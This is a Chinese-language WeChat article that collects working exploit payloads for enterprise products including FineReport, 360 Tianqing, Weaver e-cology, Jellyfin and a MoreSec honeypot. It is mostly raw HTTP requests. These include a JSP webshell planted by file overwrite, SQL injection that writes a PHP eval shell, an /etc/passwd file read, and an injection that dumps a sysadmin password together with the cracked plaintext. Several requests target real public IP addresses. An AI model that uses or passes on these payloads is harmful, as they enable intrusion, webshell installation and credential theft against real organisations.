> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/eqe6vBExE2LQ54vXT3AGSg)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqshtnWHbye1V5UmBfpoywIiag41FpucRHN4Uyib4k5Ex6t393d2jNzXP2Q/640?wx_fmt=png)

**0x01 帆软 V9 任意文件覆盖漏洞 Getshell**

```
POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1
Host:  192.168.169.138:8080
User-Agent: Mozilla/5.0(Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36
Connection: close
Accept-Au: 0c42b2f264071be0507acea1876c74
Content-Type: text/xml;charset=UTF-8
Content-Length: 675 {"__CONTENT__":"<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"pass\")!=null) {String  k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta nce().equals(pageContext);%>","__CHARSET__":"UTF-8"
```

**0x02 360 天擎逻辑越权访问**

```
GET /api/dbstat/gettablessize HTTP/1.1
```

**0x03 360 天擎前台 SQL 注入（Getshell）**

```
https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[cmd]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 

利用过程:
1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell
2. 通过注入点，创建一张表 O
3. 为表 O 添加一个新字段 T 并且写入shell内容
4. Postgres数据库使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell)
5. 删除 表O
```

**0x04 泛微 **OA e-cology** 任意文件读取**

```
GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:/etc/passwd&fileExt=txt HTTP/1.0
```

**0x05 泛微 OA e-cology8 前台 SQL 注入**

```
## 漏洞URL
http://106.15.190.147/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=***注入点***
```

在 getdata.jsp 中，直接将 request 对象交给

weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) 方法处理

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03Jiaibqs10WiaZ4uNxLV8kCuV1gRRUcibCoM1Wbia7ATIfSFluGAgSpkGicH4JBDIg/640?wx_fmt=png)

在 getData 方法中，判断请求里 cmd 参数是否为空，如果不为空，调用 proc 方法

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsPDOeVFyCHiar6BXnwzc624BvXHzRc7lUkwesvQYL2IeTibyfyfdcjEZA/640?wx_fmt=png)

Proc 方法 4 个参数，("空字符串" , "cmd 参数值" , request 对象 , serverContext 对象)，在 proc 方法中，对 cmd 参数值进行判断，当 cmd 值等于 getSelectAllId 时，再从请求中获取 sql 和 type 两个参数值，并将参数传递进 getSelectAllIds（sql,type）方法中

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsypBMIsmibCaqWgU1YZtAqOQ0ibYLH1BEejwTicficb15xUWCcGQKc2M1EA/640?wx_fmt=png)

在 getSelectAllIds(sql,type) 方法中，直接将 sql 参数的值，传递进数据库执行，并判断 type 的值是否等于 5，如果等于 5，获取查询结果的 requestId 字段，否则获取查询结果的 id 字段，到此，参数从 URL，一直到数据库被执行。

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsacBZFajNN29XL2qWYJN4DdlEVv5nhbVuesWyzkQnHVfdS0VMXewbKQ/640?wx_fmt=png)

根据以上代码流程，只要构造请求参数

```
?cmd= getSelectAllId&sql=select password as id from userinfo;
```

就可以完成对数据库操控，在浏览器中，构造测试 URL：

```
http://106.15.190.147/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id
```

页面会显示 "1234"

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsJkWmBEQq4ibIQpYibMp7abvczHT6ZhO1TsBB1LUaznzlkc19pU3XXq1g/640?wx_fmt=png)

```
## 使用payload：
Select password as id from HrmResourceManager

http://106.15.190.147/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

查询 HrmResourceManager 表中的 password 字段，页面中返回了数据库第一条记录的值（sysadmin 用户的 password）

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsgYINU4LZiaTtm9TKnmFKVQPgibxX03UD0EaCgqaicGQnoeURd3qZnibxaA/640?wx_fmt=png)

对密文进行 md5 对比：

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsWRFgxxFCOypV67nEYa14OZF6YibEianWxHReLuGkQSVFI4ibxf6cWZ34Q/640?wx_fmt=png)

```
## 使用以下账号密码登录系统
sysadmin
123450aA.
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsXnJ0qvJzMm2XNrF0X3CKw9KicZf4ztXrqFYPzicyVuAL7NNew5qd0IibQ/640?wx_fmt=png)

**0x06 泛微 OA e-cology9 前台无限制 Getshell**

```
## 漏洞位于/page/exportImport/uploadOperation.jsp文件中
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03Jiaibqs2Yd9v09tEJcB2PQ2Y5XG3iaj6u2OpJHYewcN2hiaqIlP2666ia5SAyOAQ/640?wx_fmt=png)

```
## 利用过程
对着http://127.0.0.1/page/exportImport/uploadOperation.jsp
加一个multipartRequest就可以
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsF3jTFQmA2KibUBOsQLh3EWH0ic9ibyJDhJV2YudajykjkdXUwp0nsDTvw/640?wx_fmt=png)

```
## 请求路径
view-source:http://112.91.144.90:5006/page/exportImport/fileTransfer/1.jsp
```

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsWW8kzoEliaBVa6ohcYS0k9Gribic8ggDwwic5JGrM4t8p1KRdicImygjyHw/640?wx_fmt=png)

**0x07 和信创天云桌面系统命令执行**

```
POST /Upload/upload_file.php?l=1 HTTP/1.1
Host: x.x.x.xUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Referer: x.x.x.x
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
Content-Length: 164

------WebKitFormBoundaryfcKRltGv
Content-Disposition: form-data; 
Content-Type: image/avif

------WebKitFormBoundaryfcKRltGv--
```

**0x08 CVE-2021-21402 Jellyfin 任意文件讀取漏洞**

```
## 影响版本
jellyfin<=10.7.0
## FOFA指纹
title="Jellyfin"

## POC-1
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

## POC-2
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1

## POC-3
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1

## POC-4
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1

## POC-5
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...
{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
```

**0x09 **默安蜜罐未授权访问漏洞****

```
## FOFA指纹
title="幻阵
```

进入幻阵安装系统  

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsUia71xzPRBFtr3rWcOO5cHgV2ibibFDw3sFwrDHUcOvFYYggfUicF0U4Ig/640?wx_fmt=png)

刷新并抓包  

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03Jiaibqsah0sv8WRQeYge0n1Frk8EGibXomI5Wq1nDDuhmUmgoxcb12hKrQlolg/640?wx_fmt=png)

Drop 掉 /huanzhen/have_installed?

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsZvj8ZPUic9EkNibj2EbicPG9CAibLYx5ITlNVddUlibQcEY6aiakemzQcsRA/640?wx_fmt=png)

Drop 掉 /huanzhen/mode?timestamp

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsEF60qiahqx1nsCU3t2iaG5CjVkmJDXrOEMIxLy3yuscqIxxkiciaJB78rQ/640?wx_fmt=png)

Drop 掉 /huanzhen/version_info

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsBE7RZPMBPZo4hiaiaeqg3amPR0PHmZSe6iapxibxHn8W6VczMLxKMsjZaQ/640?wx_fmt=png)

进入页面

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsIBvBqTAGxzvvfmg8v8uWabDV9tc1oCRABeOoo9PWUECIPXjdY90M8A/640?wx_fmt=png)

点击调试工具并放包

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03Jiaibqs7pDzQFS7FPrggq7D0tV6Wb13Q1dk26cfr01UpsSMgJlg0sPIOKE1lQ/640?wx_fmt=png)

可见可执行 ping 命令

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03Jiaibqs0bYXeS3kOG1AEhU5Kvv76kV5iax14vnn5DuYM3Zye0ABcGopHCExAxQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsEsaYqueDCK7sDD6E9cRLuqVqKkxuibyyR0SRF7lpYEB1V03ruuarghQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsEtRx8hxGPQX7aKEYYXkQaDiazyCFUluiavYQ8XWhZichqlRyWdY8Hr53A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsJr8X5IeUC2llLK86gqicicvibMeCtjXcibpjE72H2B4psZCloic3RWnvZdQ/640?wx_fmt=png)

点击一键诊断

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03Jiaibqs4hGSfFHKaPGicX7omFLwAKia6DEbIiaNlPwcHw7XoIr7wkhDvY8bBYnHQ/640?wx_fmt=png)

待续...  

![](https://mmbiz.qpic.cn/mmbiz_jpg/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsxhhXPo4tFc0icEG5icspCge1E8bTic3xkO4IuPvbWyCQbBIyKm23PBbRw/640?wx_fmt=jpeg)